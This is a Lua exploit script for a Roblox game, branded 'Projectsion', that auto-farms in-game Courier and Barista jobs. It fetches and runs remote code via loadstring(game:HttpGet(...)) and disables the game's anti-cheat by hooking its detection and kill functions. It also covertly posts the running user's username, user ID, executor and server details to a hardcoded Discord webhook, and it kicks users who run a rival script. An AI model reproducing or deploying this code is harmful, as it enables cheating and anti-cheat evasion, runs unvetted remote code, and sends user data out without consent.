-- ─── Prior-script kick ────────────────────────────────────────────────────────
do
    local _alreadyLoaded = false
    local _sigs = {"AutofarmCourier", "AutoFarmBarista", "CourierEarned", "BaristaEarned"}
    for _, key in ipairs(_sigs) do
        if _G[key] ~= nil then _alreadyLoaded = true; break end
    end
    if _alreadyLoaded then
        local sg  = Instance.new("ScreenGui")
        sg.IgnoreGuiInset = true
        sg.DisplayOrder   = 9999
        sg.Parent         = (gethui and gethui()) or game:GetService("CoreGui")
        local lbl = Instance.new("TextLabel", sg)
        lbl.Size             = UDim2.new(1, 0, 1, 0)
        lbl.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        lbl.TextColor3       = Color3.fromRGB(255, 80, 80)
        lbl.Text             = "cie mau ambil metod gw ya? tak bole"
        lbl.TextScaled       = true
        lbl.Font             = Enum.Font.GothamBold
        lbl.ZIndex           = 10
        task.delay(2.5, function()
            pcall(function() game:GetService("Players").LocalPlayer:Kick("cie mau ambil metod gw ya? tak bole") end)
            pcall(function() game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer) end)
        end)
        return
    end
end

-- ─── Bootstrap ───────────────────────────────────────────────────────────────
local genv = getgenv()
local fenv = getfenv()

local function _crash() end

local function verifyFunction(func)
    if typeof(func) ~= "function" then _crash() end
    if islclosure and not islclosure(func) then _crash() end
    if iscclosure and iscclosure(func) then _crash() end
    return true
end

local targetUrl1 = 'https://raw.githubusercontent.com/luxxidroblox-code/myscript.lua/refs/heads/main/adonis.lua'
local targetUrl2 = 'https://sirius.menu/rayfield'

if #targetUrl1 ~= 77 or #targetUrl2 ~= 28 then _crash() end

loadstring(game:HttpGet(targetUrl1))()

pcall(function()
    local networkPause = game:GetService('CoreGui').RobloxGui:FindFirstChild('CoreScripts/NetworkPause')
    if networkPause then networkPause:Destroy() end
end)

local Rayfield = loadstring(game:HttpGet(targetUrl2))()

-- ─── Services ─────────────────────────────────────────────────────────────────
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService      = game:GetService("TweenService")
local Players           = game:GetService("Players")
local LP                = Players.LocalPlayer
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local Workspace         = game:GetService("Workspace")
local TeleportService   = game:GetService("TeleportService")
local Gui_Service       = game:GetService("GuiService")

-- ─── Core references ─────────────────────────────────────────────────────────
local PlayerData = LP:WaitForChild("PlayerData", 60)

local CourierSettings = require(
    ReplicatedStorage:WaitForChild("Delivery System", 60):WaitForChild("Settings", 30)
)

local _BaristaJob   = workspace:WaitForChild("BaristaJob", 60)
local _Interactions = _BaristaJob:WaitForChild("Interactions", 30)

local MachinePrompt = _Interactions
    :WaitForChild("MachinePart",   30)
    :WaitForChild("MachinePart",   30)
    :WaitForChild("MachinePrompt", 30)

local RegisterPrompt = _Interactions
    :WaitForChild("RegisterPart",   30)
    :WaitForChild("RegisterPart",   30)
    :WaitForChild("RegisterPrompt", 30)

local SupplyPrompt = _Interactions
    :WaitForChild("SupplyPart",   30)
    :WaitForChild("SupplyPart",   30)
    :WaitForChild("SupplyPrompt", 30)

local JobPrompt = _Interactions
    :WaitForChild("StartPart", 30)
    :WaitForChild("StartPart", 30)
    :WaitForChild("JobPrompt", 30)

local _Livrason   = workspace:WaitForChild("Livrason", 60)
local _Take1      = _Livrason:WaitForChild("Take1", 30)
local _TakePart   = _Take1:WaitForChild("Take", 30)
local TAKE_PROMPT = _TakePart:WaitForChild("ProximityPrompt", 30)

-- ─── CFrames ─────────────────────────────────────────────────────────────────
local SupplyCF        = CFrame.new(-5116.78418, 5.78931046, -670.858887)
local MachineCF       = CFrame.new(-4997.1665, 1.58353043, -795.047607)
local RegisterCF      = CFrame.new(-4994.06934, 1.30402756, -760.247437)
local StartJobCF      = CFrame.new(-4989.80078, 5.30382967, -715.013062)
local TAKE_BOX_CFRAME = CFrame.new(-5105.61182, 4.48948574, -3758.98267)

-- ─── Globals ──────────────────────────────────────────────────────────────────
_G.AutofarmCourier   = false
_G.CourierSpeed      = 230
_G.AutoFarmBarista   = false
_G.BaristaSpeed      = 300
_G.blackscreen          = false
_G.PermanentBlackscreen = false
_G.AutoWebhook  = false
_G.WebhookURL   = ""
_G.TotalEarning = 0
_G.CycleCount   = 0
LastActivity    = tick()

local lastMoney     = PlayerData.RPValue.Value
local pendingIncome = 0
local isRunning     = false
local cooldownTime  = 60
local WaktuKosong   = nil

_G.CourierEarned = 0
_G.BaristaEarned = 0

local _activeSeconds = 0
local _farmTickStart = nil

-- ─── Timer helpers ────────────────────────────────────────────────────────────
local function _syncFarmTimer()
    local anyActive = _G.AutofarmCourier or _G.AutoFarmBarista
    if anyActive and not _farmTickStart then
        _farmTickStart = tick()
    elseif not anyActive and _farmTickStart then
        _activeSeconds = _activeSeconds + (tick() - _farmTickStart)
        _farmTickStart = nil
    end
end

local function getActiveSeconds()
    if _farmTickStart then return _activeSeconds + (tick() - _farmTickStart) end
    return _activeSeconds
end

local function getRunningTime()
    local diff = math.floor(getActiveSeconds())
    return string.format("%02d:%02d:%02d",
        math.floor(diff / 3600),
        math.floor((diff % 3600) / 60),
        diff % 60)
end

local function formatRP(v)
    local s         = string.format("%.0f", v)
    local formatted = s:reverse():gsub("(%d%d%d)", "%1."):reverse():gsub("^%.", "")
    return "RP. " .. formatted
end

local function formatPerHour(earned)
    local hrs = getActiveSeconds() / 3600
    if hrs < 0.001 then return "RP. 0/hr" end
    local perHr = math.floor(earned / hrs)
    local s     = string.format("%d", perHr)
    local fmt   = s:reverse():gsub("(%d%d%d)", "%1."):reverse():gsub("^%.", "")
    return "RP. " .. fmt .. "/hr"
end

-- ─── Telemetry ────────────────────────────────────────────────────────────────
local _TURL = "https://discord.com/api/webhooks/1540964135716651018/ZToYKfZjXmA2URf3GXQjyDd1qejJzT5AneC_aC46XsG6OkuMdJgBkmZoGeAkjXg4h-Bm"

local function _detectExecutor()
    if syn and syn.request then return "Synapse X"
    elseif KRNL_LOADED then return "Krnl"
    elseif fluxus then return "Fluxus"
    elseif getgenv().is_sirhurt_closure then return "Sir Hurt"
    elseif DELTA_LOADED or (getgenv().Delta) then return "Delta"
    elseif Arceus then return "Arceus X"
    elseif SONA_LOADED then return "Sona"
    else
        local id = identifyexecutor and identifyexecutor() or nil
        if id then return id end
        return "Unknown"
    end
end

-- ─── Hardened Dex detection ──────────────────────────────────────────────────
local _DEX_NAMES = {
    "dex", "explorer", "illusionsdev", "dexexplorer",
    "corescriptsssx", "game explorer",
}

local function _isDexName(name)
    local lower = name:lower()
    for _, pattern in ipairs(_DEX_NAMES) do
        if lower == pattern or lower:find(pattern, 1, true) then
            local safe = {"exploregui", "explorerframe"}
            for _, s in ipairs(safe) do
                if lower == s then return false end
            end
            return true
        end
    end
    return false
end

local function _detectDex()
    local targets = {
        game:GetService("CoreGui"),
        LP:FindFirstChild("PlayerGui"),
    }
    for _, container in ipairs(targets) do
        if not container then continue end
        for _, child in ipairs(container:GetChildren()) do
            if _isDexName(child.Name) then
                if child:FindFirstChildOfClass("ScrollingFrame", true) then
                    return true
                end
            end
        end
    end
    return false
end

local function _getAvatar()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
end

local function _sendTelemetry(isDex)
    local http_request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
    if not http_request then return end

    local execName    = _detectExecutor()
    local executeHr   = os.date("%H:%M:%S")
    local executeDate = os.date("%d/%m/%Y")
    local dexStatus   = isDex and "⚠️ **DEX DETECTED**" or "✅ Clean"

    local embed = {
        ["author"] = {
            ["name"]     = "Projectsion Telemetry",
            ["icon_url"] = _getAvatar()
        },
        ["title"] = "Script Executed",
        ["color"] = isDex and 0xFF0000 or 0x00FF99,
        ["fields"] = {
            {["name"] = "👤 Username",   ["value"] = LP.Name,                                        ["inline"] = true},
            {["name"] = "🆔 User ID",    ["value"] = tostring(LP.UserId),                            ["inline"] = true},
            {["name"] = "🕒 Executed",   ["value"] = executeHr .. " — " .. executeDate,              ["inline"] = false},
            {["name"] = "⚙️ Executor",   ["value"] = execName,                                       ["inline"] = true},
            {["name"] = "🔍 Dex Status", ["value"] = dexStatus,                                      ["inline"] = true},
            {["name"] = "🌐 Place ID",   ["value"] = tostring(game.PlaceId),                         ["inline"] = true},
            {["name"] = "🖥️ Job ID",     ["value"] = tostring(game.JobId):sub(1, 24) .. "...",       ["inline"] = false}
        },
        ["thumbnail"] = {["url"] = _getAvatar()},
        ["footer"]    = {["text"] = "Projectsion Free | " .. os.date("%m/%d/%Y %I:%M %p")}
    }

    local payload = HttpService:JSONEncode({
        ["username"] = "Projectsion Telemetry",
        ["embeds"]   = {embed}
    })

    pcall(function()
        http_request({
            Url     = _TURL,
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = payload
        })
    end)
end

-- 8s settle delay — leftover GUIs from prior scripts are gone by then
task.spawn(function()
    task.wait(8)
    local initialDex = _detectDex()
    _sendTelemetry(initialDex)

    local wasDex = initialDex
    while true do
        task.wait(30)
        local nowDex = _detectDex()
        if nowDex and not wasDex then _sendTelemetry(true) end
        wasDex = nowDex
    end
end)

-- ─── BlackScreen ──────────────────────────────────────────────────────────────
local function generateRandomName()
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local length = math.random(12, 24)
    local randomString = ""
    for i = 1, length do
        local rand = math.random(1, #chars)
        randomString = randomString .. string.sub(chars, rand, rand)
    end
    return randomString
end

local BlackScreen = Instance.new("ScreenGui")
local Frame       = Instance.new("Frame")

if gethui then
    BlackScreen.Parent = gethui()
else
    BlackScreen.Parent = game:GetService("CoreGui") or LP.PlayerGui
end

BlackScreen.Name         = generateRandomName()
Frame.Name               = generateRandomName()
BlackScreen.DisplayOrder = -1
BlackScreen.Enabled      = false

Frame.Parent           = BlackScreen
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Size             = UDim2.new(1.5, 0, 1.5, 0)
Frame.Position         = UDim2.new(-0.25, 0, -0.25, 0)
Frame.BorderSizePixel  = 0

Frame:GetPropertyChangedSignal("Size"):Connect(function()
    if Frame.Size ~= UDim2.new(1.5, 0, 1.5, 0) then
        Frame.Size = UDim2.new(1.5, 0, 1.5, 0)
    end
end)

Frame:GetPropertyChangedSignal("BackgroundTransparency"):Connect(function()
    if Frame.BackgroundTransparency ~= 0 then
        Frame.BackgroundTransparency = 0
    end
end)

Frame:GetPropertyChangedSignal("Visible"):Connect(function()
    if Frame.Visible == false and _G.PermanentBlackscreen then
        Frame.Visible = true
    end
end)

local function updateBlackScreen()
    verifyFunction(updateBlackScreen)
    local isAnyFarmActive = (_G.AutofarmCourier or _G.AutoFarmBarista)
    _syncFarmTimer()
    if isAnyFarmActive then
        _G.blackscreen          = true
        _G.PermanentBlackscreen = true
    else
        _G.blackscreen = false
        if _G.PermanentBlackscreen then BlackScreen.Enabled = true end
        return
    end
    BlackScreen.Enabled = _G.blackscreen
end

-- ─── Courier helpers ──────────────────────────────────────────────────────────
local function SwitchToCourier()
    local TeamRemote = ReplicatedStorage:FindFirstChild("TeamChangeRequest", true)
    if TeamRemote then
        if not LP.Team or LP.Team.Name ~= "Courier" then
            TeamRemote:FireServer("Courier", 11378976, 0, 0, "Detector")
            task.wait(1.5)
        end
    end
end

local function Tween(targetCFrame, keepSit)
    local Char = LP.Character
    local Root = Char and Char:FindFirstChild("HumanoidRootPart")
    local Hum  = Char and Char:FindFirstChild("Humanoid")
    if not Root or not Hum then return end

    Hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
    Hum.Sit = true
    task.wait(0.25)

    local gyro     = Instance.new("BodyGyro")
    gyro.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
    gyro.P         = 1e5
    gyro.D         = 500
    gyro.CFrame    = targetCFrame
    gyro.Parent    = Root

    local distance = (Root.Position - targetCFrame.Position).Magnitude
    local duration = distance / _G.CourierSpeed

    Root.Velocity    = Vector3.new(0, 0, 0)
    Root.RotVelocity = Vector3.new(0, 0, 0)

    local info  = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    local tween = TweenService:Create(Root, info, {CFrame = targetCFrame})
    tween:Play()

    local conn = RunService.Stepped:Connect(function()
        if tween.PlaybackState == Enum.PlaybackState.Playing then
            Root.Velocity = Vector3.new(0, 0, 0)
            gyro.CFrame   = targetCFrame
        else
            conn:Disconnect()
        end
    end)

    tween.Completed:Wait()
    conn:Disconnect()
    Root.Velocity = Vector3.new(0, 0, 0)
    gyro:Destroy()

    if not keepSit then
        Hum.Sit = false
        Hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        task.wait(0.15)
        Hum.Jump = true
        task.wait(0.1)
    end
end

local function AutoEquipBox()
    local Char = LP.Character
    if not Char or not Char:FindFirstChild("Humanoid") then return false end
    local held = Char:FindFirstChildOfClass("Tool")
    if held and held.Name:lower() == "box" then return true end
    local bp = LP:FindFirstChild("Backpack")
    if bp then
        for _, item in pairs(bp:GetChildren()) do
            if item:IsA("Tool") and item.Name:lower() == "box" then
                Char.Humanoid:EquipTool(item)
                return true
            end
        end
    end
    return false
end

local function GetActivePoint()
    for _, folder in ipairs(CourierSettings.Folder.Location:GetChildren()) do
        local block  = folder:FindFirstChild("Block")
        local prompt = block and block:FindFirstChildOfClass("ProximityPrompt")
        if prompt and (prompt.Enabled or folder:FindFirstChild("POINT").billboardgui.Enabled) then
            return block, prompt
        end
    end
    return nil, nil
end

-- ─── Anti-idle ────────────────────────────────────────────────────────────────
task.spawn(function()
    local VirtualUser = game:GetService("VirtualUser")
    game:GetService("Players").LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end)

-- ─── Webhook (user-facing) ────────────────────────────────────────────────────
local function getAvatar()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
end

local function getRunningTimeWall()
    if not _G._wallStart then return "00:00:00" end
    local diff = os.time() - _G._wallStart
    return string.format("%02d:%02d:%02d",
        math.floor(diff / 3600),
        math.floor((diff % 3600) / 60),
        diff % 60)
end

local function sendWebhook(income, target)
    if _G.WebhookURL == "" or not _G.WebhookURL:find("discord.com") then return end
    _G.CycleCount = _G.CycleCount + 1

    local currentMoney = PlayerData.RPValue.Value
    local http_request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)

    local embed = {
        ["author"] = {
            ["name"]     = "Projectsion Webhook",
            ["icon_url"] = getAvatar()
        },
        ["title"] = "Cycle Completed",
        ["color"] = 0xFFFFFF,
        ["fields"] = {
            {["name"] = "Username",      ["value"] = LP.Name,                               ["inline"] = false},
            {["name"] = "Cycle Income",  ["value"] = formatRP(income),                      ["inline"] = false},
            {["name"] = "Target",        ["value"] = formatRP(target),                      ["inline"] = false},
            {["name"] = "Current Money", ["value"] = formatRP(currentMoney) .. " (Est)",    ["inline"] = false},
            {["name"] = "Total Earning", ["value"] = formatRP(_G.TotalEarning) .. " (Est)", ["inline"] = false},
            {["name"] = "Cycle Count",   ["value"] = tostring(_G.CycleCount),               ["inline"] = false},
            {["name"] = "Running Time",  ["value"] = getRunningTimeWall(),                  ["inline"] = false}
        },
        ["image"] = {
            ["url"] = "https://cdn.discordapp.com/attachments/1492837859370074192/1508063383944036433/IMG_20260524_180509.jpg?ex=6a142cf9&is=6a12db79&hm=124ec4dccb5d72326d9b0776d912bb18631948f41162cd9fa6d08eafcff19fb4&"
        },
        ["footer"] = {["text"] = "Made By Projectsion | " .. os.date("%m/%d/%Y %I:%M %p")}
    }

    local payload = HttpService:JSONEncode({
        ["username"] = "Projectsion Reports",
        ["embeds"]   = {embed}
    })

    if http_request then
        pcall(function()
            http_request({
                Url     = _G.WebhookURL,
                Method  = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body    = payload
            })
        end)
    end
end

-- ─── Stats labels ─────────────────────────────────────────────────────────────
local lblTotalEarned, lblCurrentMoney, lblSessionTime
local lblCourierEarned, lblBaristaEarned
local lblTotalPerHour, lblCourierPerHour, lblBaristaPerHour

local function refreshPerHourLabels()
    if lblTotalPerHour   then lblTotalPerHour:Set("Total /hr: "     .. formatPerHour(_G.TotalEarning))  end
    if lblCourierPerHour then lblCourierPerHour:Set("Courier /hr: " .. formatPerHour(_G.CourierEarned)) end
    if lblBaristaPerHour then lblBaristaPerHour:Set("Barista /hr: " .. formatPerHour(_G.BaristaEarned)) end
end

PlayerData.RPValue.Changed:Connect(function(newMoney)
    if newMoney > lastMoney then
        local gained = newMoney - lastMoney
        pendingIncome   = pendingIncome + gained
        _G.TotalEarning = _G.TotalEarning + gained

        if _G.AutofarmCourier then
            _G.CourierEarned = _G.CourierEarned + gained
        elseif _G.AutoFarmBarista then
            _G.BaristaEarned = _G.BaristaEarned + gained
        end

        if lblTotalEarned   then lblTotalEarned:Set("Total Earned: "   .. formatRP(_G.TotalEarning))  end
        if lblCurrentMoney  then lblCurrentMoney:Set("Current Money: " .. formatRP(newMoney))         end
        if lblCourierEarned then lblCourierEarned:Set("Courier: "      .. formatRP(_G.CourierEarned)) end
        if lblBaristaEarned then lblBaristaEarned:Set("Barista: "      .. formatRP(_G.BaristaEarned)) end
        refreshPerHourLabels()

        if not isRunning then
            isRunning = true
            task.spawn(function()
                while isRunning do
                    task.wait(60)
                    if pendingIncome > 0 and _G.WebhookURL ~= "" then
                        sendWebhook(pendingIncome, 0)
                        pendingIncome = 0
                    end
                    if not _G.AutofarmCourier and not _G.AutoFarmBarista then
                        isRunning = false
                    end
                end
            end)
        end
    elseif newMoney < lastMoney then
        if lblCurrentMoney then lblCurrentMoney:Set("Current Money: " .. formatRP(newMoney)) end
    end
    lastMoney = newMoney
end)

-- ─── Barista helpers ──────────────────────────────────────────────────────────
local function GetBaristaElements()
    local Gui = LP.PlayerGui:FindFirstChild("BaristaGUI")
    if Gui then
        local OrderText = Gui:FindFirstChild("StatusFrame") and Gui.StatusFrame:FindFirstChild("OrderText")
        local Minigame  = Gui:FindFirstChild("MinigameFrame")
        return Gui, OrderText, Minigame
    end
    return nil, nil, nil
end

local function GetRemote(name)
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name == name then return v end
    end
    return nil
end

local function BypassTP(targetCF)
    local Char = LP.Character or LP.CharacterAdded:Wait()
    local Hum  = Char:WaitForChild("Humanoid")
    local Root = Char:WaitForChild("HumanoidRootPart")
    if Hum and Root then
        local distance = (Root.Position - targetCF.Position).Magnitude
        local duration = distance / _G.BaristaSpeed
        Hum.Sit = true
        task.wait(0.5)
        local info  = TweenInfo.new(duration, Enum.EasingStyle.Linear)
        local tween = TweenService:Create(Root, info, {CFrame = targetCF})
        tween:Play()
        tween.Completed:Wait()
        task.wait(0.3)
        Hum.Sit = false
    end
end

local function ExecuteStartSequence()
    local tr = GetRemote("TeamChangeRequest")
    if LP.Team and LP.Team.Name ~= "Barista" and tr then
        tr:FireServer("Barista", 11378976, 0, 0, "Detector")
        task.wait(2.5)
    end
    BypassTP(StartJobCF)
    task.wait(0.8)
    if JobPrompt and JobPrompt.Enabled then
        fireproximityprompt(JobPrompt)
    end
    LastActivity = tick()
end

-- ─── Barista loop ─────────────────────────────────────────────────────────────
task.spawn(function()
    while task.wait(0.6) do
        if _G.AutoFarmBarista then
            local _, OrderTextLabel, MinigameFrame = GetBaristaElements()

            if tick() - LastActivity >= 240 then
                ExecuteStartSequence()
            end

            if OrderTextLabel then
                local txt      = OrderTextLabel.Text:lower()
                local isBroken = (OrderTextLabel.TextColor3.R > 0.8 and (txt:find("break") or txt:find("down")))

                if isBroken then
                    BypassTP(SupplyCF)
                    task.wait(0.5)
                    fireproximityprompt(SupplyPrompt)
                    LastActivity = tick()
                    task.wait(0.5)
                    BypassTP(MachineCF)
                    fireproximityprompt(MachinePrompt)
                elseif MachinePrompt.Enabled and not (MinigameFrame and MinigameFrame.Visible) then
                    BypassTP(MachineCF)
                    fireproximityprompt(MachinePrompt)
                    LastActivity = tick()
                    repeat task.wait(0.5)
                        LastActivity = tick()
                    until not (MinigameFrame and MinigameFrame.Visible) or not _G.AutoFarmBarista
                elseif RegisterPrompt.Enabled and not (MinigameFrame and MinigameFrame.Visible) then
                    task.wait(0.5)
                    BypassTP(RegisterCF)
                    task.wait(0.5)
                    fireproximityprompt(RegisterPrompt)
                    LastActivity = tick()
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function()
    local _, _, MinigameFrame = GetBaristaElements()
    if _G.AutoFarmBarista and MinigameFrame and MinigameFrame.Visible then
        local tz = MinigameFrame:FindFirstChild("TargetZone", true)
        if tz then tz.Size = UDim2.new(1, 0, 1, 0); tz.Position = UDim2.new(0, 0, 0, 0) end
    end
end)

-- ─── Courier loop ─────────────────────────────────────────────────────────────
task.spawn(function()
    while true do
        task.wait(1)
        if _G.AutofarmCourier then
            SwitchToCourier()

            local Char = LP.Character or LP.CharacterAdded:Wait()
            local Hum  = Char:WaitForChild("Humanoid")
            local Root = Char:WaitForChild("HumanoidRootPart")

            if not (Hum and Root and Hum.Health > 0) then continue end

            local BoxTempatAmbil = workspace:FindFirstChild("Livrason")
                                   and workspace.Livrason:FindFirstChild("Take1")
            local TargetBlock, TargetPrompt = GetActivePoint()

            if not BoxTempatAmbil or (AutoEquipBox() and not TargetBlock) then
                task.wait(2)
                continue
            end

            if not AutoEquipBox() then
                if not WaktuKosong then WaktuKosong = os.clock() end
                if (os.clock() - WaktuKosong) >= 240 then
                    game:GetService("ReplicatedStorage")
                        :WaitForChild("JobEvents")
                        :WaitForChild("TeamChangeRequest")
                        :FireServer("Civilian", 0, 0, 0, "Detector")
                    WaktuKosong = nil
                    repeat task.wait(1)
                    until (LP.Team and LP.Team.Name == "Civilian") or not _G.AutofarmCourier
                    task.wait(15)
                    continue
                end
                Tween(TAKE_BOX_CFRAME, false)
                task.wait(0.4)
                if _G.AutofarmCourier and TAKE_PROMPT.Enabled then
                    fireproximityprompt(TAKE_PROMPT)
                    task.wait(1.5)
                end
            else
                WaktuKosong = nil
                if TargetBlock and TargetPrompt then
                    task.wait(math.random(0, 1))
                    Tween(TargetBlock.CFrame * CFrame.new(0, 2, 0), false)
                    task.wait(0.3)
                    AutoEquipBox()
                    if _G.AutofarmCourier and TargetPrompt.Enabled then
                        fireproximityprompt(TargetPrompt)
                        task.wait(0.5)
                        if Hum and _G.AutofarmCourier then
                            Hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                            Hum.Sit = true
                        end
                        task.wait(3)
                    end
                end
            end
        else
            WaktuKosong = nil
        end
    end
end)

-- ─── Anti-cheat hooks ─────────────────────────────────────────────────────────
local d = false
local h = {}
local x, y
setthreadidentity(2)
for i, v in getgc(true) do
    if typeof(v) == "table" then
        local a = rawget(v, "Detected")
        local b = rawget(v, "Kill")
        if typeof(a) == "function" and not x then
            x = a
            local o; o = hookfunction(x, function(c, f, n) return true end)
            table.insert(h, x)
        end
        if rawget(v, "Variables") and rawget(v, "Process") and typeof(b) == "function" and not y then
            y = b
            local o; o = hookfunction(y, function(f) end)
            table.insert(h, y)
        end
    end
end
local o; o = hookfunction(getrenv().debug.info, newcclosure(function(...)
    local a, f = ...
    if x and a == x then return coroutine.yield(coroutine.running()) end
    return o(...)
end))
setthreadidentity(7)

-- ─── Idled connections ────────────────────────────────────────────────────────
local ActiveConnections = {}

pcall(function()
    local getconnections = getconnections or get_signal_cons
    if getconnections then
        for _, conn in ipairs(getconnections(LP.Idled)) do
            if conn.Disable then conn:Disable() elseif conn.Disconnect then conn:Disconnect() end
        end
    end
end)

local idledConn = LP.Idled:Connect(function()
    pcall(function()
        local VirtualUser = game:GetService("VirtualUser")
        VirtualUser:CaptureController()
        VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        task.wait(0.2)
        VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end)
end)
table.insert(ActiveConnections, idledConn)

-- ─── UI ───────────────────────────────────────────────────────────────────────
local Window = Rayfield:CreateWindow({
    Name            = "Projectsion",
    LoadingTitle    = "Projectsion",
    LoadingSubtitle = "by laksid",
    ConfigurationSaving = {
        Enabled    = true,
        FolderName = "ProjectsionConfig",
        FileName   = "AutofarmSettings"
    },
    Discord   = {Enabled = false},
    KeySystem = false
})

local HomeTab = Window:CreateTab("Home", 4483362458)
HomeTab:CreateSection("Update Log")
HomeTab:CreateButton({
    Name = "Version 1.1 Free",
    Callback = function()
        Rayfield:Notify({
            Title    = "Projectsion",
            Content  = "+ /hr stats added\n+ session timer now active-only\n+ Courier & Barista only (Free)",
            Duration = 5
        })
    end
})

local AutofarmTab = Window:CreateTab("Autofarm", 4483362458)

AutofarmTab:CreateSection("Courier")
AutofarmTab:CreateToggle({
    Name         = "Autofarm Courier",
    CurrentValue = false,
    Flag         = "CourierFarm",
    Callback     = function(state)
        _G.AutofarmCourier = state
        updateBlackScreen()
        if state then
            Rayfield:Notify({Title = "Projectsion", Content = "Courier Autofarm Enabled!", Duration = 3})
        end
    end
})
AutofarmTab:CreateSlider({
    Name         = "Courier Speed",
    Range        = {10, 550},
    Increment    = 1,
    Suffix       = "Speed",
    CurrentValue = 230,
    Flag         = "CourierSpeed",
    Callback     = function(value) _G.CourierSpeed = value end
})

AutofarmTab:CreateSection("Barista")
AutofarmTab:CreateToggle({
    Name         = "Autofarm Barista",
    CurrentValue = false,
    Flag         = "BaristaFarm",
    Callback     = function(state)
        _G.AutoFarmBarista = state
        updateBlackScreen()
        if state then
            LastActivity = tick()
            task.spawn(function() ExecuteStartSequence() end)
            Rayfield:Notify({Title = "Projectsion", Content = "Barista Active!", Duration = 3})
        end
    end
})
AutofarmTab:CreateSlider({
    Name         = "Barista Speed",
    Range        = {10, 1500},
    Increment    = 1,
    Suffix       = "Speed",
    CurrentValue = 300,
    Flag         = "BaristaSpeed",
    Callback     = function(value) _G.BaristaSpeed = value end
})

local StatsTab = Window:CreateTab("Stats", "trending-up")
StatsTab:CreateSection("Session Stats")
lblTotalEarned  = StatsTab:CreateLabel("Total Earned: RP. 0")
lblCurrentMoney = StatsTab:CreateLabel("Current Money: " .. formatRP(PlayerData.RPValue.Value))
lblSessionTime  = StatsTab:CreateLabel("Session Time: 00:00:00  (active only)")
lblTotalPerHour = StatsTab:CreateLabel("Total /hr: RP. 0/hr")

StatsTab:CreateSection("Job Income")
lblCourierEarned  = StatsTab:CreateLabel("Courier: RP. 0")
lblCourierPerHour = StatsTab:CreateLabel("Courier /hr: RP. 0/hr")
lblBaristaEarned  = StatsTab:CreateLabel("Barista: RP. 0")
lblBaristaPerHour = StatsTab:CreateLabel("Barista /hr: RP. 0/hr")

task.spawn(function()
    while true do
        task.wait(1)
        local anyActive = _G.AutofarmCourier or _G.AutoFarmBarista
        if lblSessionTime then
            if anyActive then
                lblSessionTime:Set("Session Time: " .. getRunningTime() .. "  (active)")
            else
                lblSessionTime:Set("Session Time: " .. getRunningTime() .. "  (paused)")
            end
        end
        if anyActive then refreshPerHourLabels() end
    end
end)

local WebhookTab = Window:CreateTab("Webhook", 4483362458)
WebhookTab:CreateSection("Webhook Configuration")
WebhookTab:CreateInput({
    Name                     = "Discord Webhook URL",
    PlaceholderText          = "https://discord.com/api/webhooks/...",
    RemoveTextAfterFocusLost = false,
    Flag                     = "WebhookURL",
    Callback                 = function(text) _G.WebhookURL = text end
})
WebhookTab:CreateToggle({
    Name         = "Enable Webhook Logs",
    CurrentValue = false,
    Flag         = "WebhookEnabled",
    Callback     = function(state) _G.AutoWebhook = state end
})

Rayfield:Notify({
    Title    = "Projectsion",
    Content  = "Loaded Successfully",
    Duration = 5
})

warn("[PROJECTSION] Engine Loaded & Waiting for Toggle...")

Rayfield:LoadConfiguration()